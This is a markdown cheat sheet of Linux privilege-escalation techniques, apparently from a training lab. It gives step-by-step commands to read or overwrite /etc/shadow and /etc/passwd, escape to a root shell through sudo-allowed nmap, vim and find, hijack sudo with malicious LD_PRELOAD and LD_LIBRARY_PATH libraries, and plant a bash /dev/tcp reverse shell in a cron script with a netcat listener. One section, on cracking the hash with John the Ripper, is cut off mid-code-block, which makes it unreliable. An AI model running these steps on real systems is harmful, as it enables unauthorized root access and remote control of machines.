# üõ°Ô∏è <span style="color:#32CD32">**Weak File Permissions (Readable shadow file)**</span>


## **Check the Permissions of the `shadow` File**

```bash
ls -l /etc/shadow
```

---

## **Show the Hash of the Root Password**

```bash
cat /etc/shadow
```

---

## **Crack the Hash with John the Ripper (Dictionary Attack)**

```bash

# üîì **Weak File Permissions (Writable Shadow File) Exploit**



##   **Check the Permissions of the Shadow File**

Ensure the shadow file is writable:

```bash
ls -l /etc/shadow
```

---

##   **Generate a New Password Hash**

To create a password hash with your chosen password, use the following command:

```bash
mkpasswd -m (hashing algorithm) newpass
```

For example, to use **SHA-512**, the command would be:

```bash
mkpasswd -m sha-512 newpass
```

---

##  **Edit the Shadow File and Replace the Root Password Hash**

1. Open the **shadow** file with elevated privileges using a text editor like `nano` or `vi`:

```bash
nano /etc/shadow
```

2. Find the **root** entry in the shadow file.  
3. Replace the old hash with your newly generated password hash.

---

##   **Gain Root Privileges**

After replacing the password hash, escalate your privileges with:

```bash
sudo su
```

# üåê Weak File Permissions (Writable passwd File)



## **Check the Permissions of the `/etc/passwd` File**

First, verify that the `/etc/passwd` file is world-writable:

```bash
ls -l /etc/passwd
```

Look for a **w** in the third section of the file permissions (e.g., `-rw-rw-rw-`).

---

## **Generate a New Password Hash**

Generate a new password hash for a password of your choice using the **openssl** command:

```bash
openssl passwd newpasswordhere
```

This will output a hashed password that you can use in the next step.

---

## **Edit the `/etc/passwd` File**

Open the `/etc/passwd` file using a text editor like `nano`:

```bash
nano /etc/passwd
```

---

## **Replace or Add a Password Hash for Root**

- **Replace the Root User's Password Hash**:  
  Find the **root** user's row (the first row in the file) and replace the **x** between the first and second colon (`:`) with the newly generated password hash.

  **Before:**

  ```
  root:x:0:0:root:/root:/bin/bash
  ```

  **After:**

  ```
  root:$6$abcde$hashgoeshere:0:0:root:/root:/bin/bash
  ```

---

## **Switch to the Root**

 use the new password to switch to the root user:

```bash
su root
```


# üîç <span style="color:#1E90FF">**Exploiting Programs from `sudo -l` using GTFOBins**</span>



### <span style="color:#FF6347">**Step 1: Run `sudo -l` to List Allowed Commands**</span>

Open your terminal and run the following command to list the allowed `sudo` commands for your user:

```bash
sudo -l
```

This command displays all programs you are allowed to run with `sudo`. Example output:

```bash
User user may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/nmap
    (ALL) NOPASSWD: /bin/bash
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/find
```

---

###  <span style="color:#32CD32">**Step 2: Identify Exploitable Programs on GTFOBins**</span>

Head over to [GTFOBins](https://gtfobins.github.io/) and search for each program that appeared in your `sudo -l` output. This website lists binaries that can be exploited to escalate privileges.

**Search for each program** listed in your `sudo -l` output such as `nmap`, `bash`, `vim`, etc., on GTFOBins.

---

### Ô∏è <span style="color:#FFD700">**Step 3: Follow GTFOBins Instructions**</span>

For every exploitable program you find on GTFOBins, follow the instructions provided on the website to perform privilege escalation.

---

### **Examples of Exploitable Programs**:

---

####  <span style="color:#FF6347">**1. `nmap` Exploit:**</span>

If `nmap` is listed in `sudo -l`:

1. Visit the [nmap page on GTFOBins](https://gtfobins.github.io/gtfobins/nmap/).
2. Follow these Sudo instructions:
   ```bash
   sudo nmap --interactive
   ```
3. Once inside the interactive prompt, type:
   ```bash
   !sh
   ```
   This will spawn a **root shell**.

---

####  <span style="color:#32CD32">**2. `bash` Exploit:**</span>

If `bash` is listed in `sudo -l`, follow these steps:

1. Visit the [bash page on GTFOBins](https://gtfobins.github.io/gtfobins/bash/).
2. Run the command:
   ```bash
   sudo bash
   ```
   This will directly give you a **root shell**.

---

####  <span style="color:#FFD700">**3. `vim` Exploit:**</span>

If `vim` appears in your `sudo -l` output, follow these steps:

1. Visit the [vim page on GTFOBins](https://gtfobins.github.io/gtfobins/vim/).
2. Use the following command:
   ```bash
   sudo vim -c ':!sh'
   ```
   This will drop you into a **root shell** within the `vim` editor.

---

####  <span style="color:#1E90FF">**4. `find` Exploit:**</span>

If `find` is listed:

1. Visit the [find page on GTFOBins](https://gtfobins.github.io/gtfobins/find/).
2. Run the following:
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```
   This will spawn a **root shell** using the `find` command.

---

###  <span style="color:#FF4500">**Step 4: Verify Your Privilege Escalation**</span>

After executing the GTFOBins instructions, verify that you‚Äôve escalated privileges successfully by running:

```bash
whoami
```

If the output is `root`, you‚Äôve **successfully gained root access**!

---

###  <span style="color:#FF6347">**Step 5: Repeat for Each Program**</span>

Search each program listed by `sudo -l` on GTFOBins and follow the steps provided to see if you can exploit them for privilege escalation.

By following this process, you can methodically **exploit allowed binaries** and **gain root access** on your system!


# ‚öôÔ∏è **LD_PRELOAD Exploit**



##  <span style="color:#1E90FF">**Step 1: List the Programs Allowed by `sudo -l`**</span>

First, identify which programs you are allowed to run with `sudo` by executing:

```bash
sudo -l
```

This will give you a list of programs that can be run without a password. 

---

## Ô∏è <span style="color:#32CD32">**Step 2: Create a Shared Object from `/home/user/tools/sudo/preload.c`**</span>

Next, compile the malicious shared object using the provided code (`preload.c`). Run this command:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

This will create the `preload.so` file in the `/tmp` directory, ready to be loaded into a privileged process.

---

##  <span style="color:#FFD700">**Step 3: Run a Program with `LD_PRELOAD` to Exploit**</span>

Now, execute one of the programs from the `sudo -l` list while setting the `LD_PRELOAD` environment variable to your malicious shared object:

```bash
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

Replace `program-name-here` with the actual program name from your `sudo -l` output. This should allow you to escalate privileges and gain control over the target process.



# üß© **LD_LIBRARY Exploit**




##  **Run `ldd` to See Apache2 Shared Libraries**

To check which shared libraries are used by Apache2, run the following command:

```bash
ldd /usr/sbin/apache2
```

This will list all the shared libraries that Apache2 relies on, including the paths to those libraries.

---

## Ô∏è **Create a Malicious Shared Object (libcrypt.so.1)**

From the libraries listed, let's create a malicious shared object with the same name as `libcrypt.so.1` using the provided exploit code `library_path.c`. 

To compile the malicious shared object, run:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

This command compiles the code and outputs a shared object called `libcrypt.so.1` into the `/tmp` directory.

---

##  **Run Apache2 with the `LD_LIBRARY_PATH` Exploit**

Now, execute Apache2 using `sudo` while specifying the `LD_LIBRARY_PATH` environment variable to point to the directory where your malicious shared object (`/tmp`) is stored:

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

By doing this, Apache2 will load your malicious shared object instead of the legitimate one, potentially allowing you to exploit the system.

# üìÑ cron jobs-file permission

##  **Step 1: View the Contents of the System-Wide Crontab**

Check the system-wide crontab to identify scheduled tasks:

```bash
cat /etc/crontab
```

This command displays the system's cron jobs, which can help you find automated tasks that may run `overwrite.sh`.

---

##  **Step 2: Locate the Full Path of the `overwrite.sh` File**

To find the exact location of `overwrite.sh`, use:

```bash
locate overwrite.sh
```

This command will return the full path of the file so you can modify it.

---

## **Step 3: Edit the `overwrite.sh` File to Include a Reverse Shell**

Edit the file to insert the following reverse shell code:

```bash
#!/bin/bash
bash -i >& /dev/tcp/your-ip/listen-port 0>&1
```

Replace `your-ip` with your attacker's IP address and `listen-port` with the port you're listening on (e.g., `4444`).

---

## **Step 4: Set Up a Netcat Listener in Another Shell Tab**

In a new terminal tab, set up a listener with Netcat to catch the reverse shell:

```bash
nc -nvlp 4444
```

This will open port `4444` and wait for incoming connections from the reverse shell.

---

Once the cron job runs the `overwrite.sh` script, it should execute the reverse shell, connecting back to your Netcat listener.
